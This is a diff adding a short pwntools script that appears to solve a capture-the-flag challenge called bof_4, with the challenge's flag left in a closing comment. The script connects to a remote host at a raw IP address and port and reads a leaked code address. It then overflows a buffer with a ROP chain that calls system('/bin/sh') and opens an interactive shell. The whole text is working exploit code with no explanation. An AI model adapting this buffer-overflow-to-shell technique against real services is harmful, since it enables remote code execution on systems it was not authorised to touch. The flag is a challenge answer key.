@@ -1,0 +1,27 @@
+from pwn import * 
+
+e = ELF("./bof_4")
+
+script = '''
+b *main
+'''
+
+p = remote("103.69.97.144", 6031)
+#p = gdb.debug("./bof_4", gdbscript = script)
+
+p.recvuntil(b"Opps! ")
+code_base = int(p.recvline(), 16)
+
+pop_rdi = code_base + 0x00000000000011f8
+ret = pop_rdi + 1
+binsh = code_base + 0x2008
+system_plt = code_base + e.plt['system']
+
+payload = b"A" * 0x60
+payload += b"B" * 8 + p64(pop_rdi)
+payload += p64(binsh) + p64(ret)
+payload += p64(system_plt)
+p.sendlineafter(b"number: ", payload)
+
+p.interactive()
+#BKSEC{apP13_pi3_1s_D3lIC1ouS_BuT_NoT_p1E}
